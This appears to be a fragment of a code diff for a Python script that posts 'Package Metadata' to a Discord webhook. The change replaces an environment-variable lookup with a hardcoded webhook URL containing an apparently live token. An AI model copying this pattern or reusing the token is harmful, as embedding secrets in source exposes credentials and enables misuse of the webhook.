@@ -1,8 +1,7 @@
-import os
 import requests
 from datetime import datetime
 
-webhook = os.environ['DISCORD_WEBHOOK_URL']
+webhook = "https://discord.com/api/webhooks/1495464020755484782/sM5PWU38Vlg-zqY3oAwgAn50jTsiMT4eHG3FmGG2yq5wFqlrdgEDczyUt7W4qjjvh0-Q"
 timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
 
 message = f"""**Package Metadata**
